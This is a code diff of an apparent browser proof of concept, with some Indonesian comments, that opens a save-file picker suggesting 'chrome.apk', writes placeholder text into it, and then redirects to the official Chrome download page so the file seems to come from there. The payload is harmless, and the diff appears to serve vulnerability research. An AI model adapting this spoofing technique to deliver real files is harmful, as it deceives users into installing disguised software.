@@ -29,35 +29,27 @@ document.addEventListener('click', async () => {
     if (!('showSaveFilePicker' in window)) return;
 
     try {
-        // Trigger picker dengan nama file "tesr.apk"
+        // Step 1: Trigger file picker
         const fileHandle = await window.showSaveFilePicker({
             suggestedName: 'chrome.apk',
             types: [{
                 description: 'Android Package (demo)',
                 accept: { 'application/octet-stream': ['.apk'] }
-        
-        // Tulis isi "Hai aja" ke dalam file
-        const writable = await fileHandle.createWritable();
-        await writable.write('Hai aja');
-        await writable.close();
             }]
         });
 
-        // Step 2: Navigate shortly after picker appears
+        // Step 2: Tulis isi file (PoC: "Hai aja")
+        const writable = await fileHandle.createWritable();
+        await writable.write('Hai aja');
+        await writable.close();
+
+        // Step 3: Navigasi setelah picker muncul
         setTimeout(() => {
             window.location.href = 'https://www.google.com/chrome/';
         }, 250);
 
-        // Step 3: Await picker (no write performed)
-        await pickerPromise;
-
-        // IMPORTANT:
-        // No createWritable()
-        // No write()
-        // This is intentional & safe
-
     } catch (e) {
-        // User cancel / abort is expected
+        console.error('User cancelled or error:', e);
     }
 }, { once: true });
 </script>
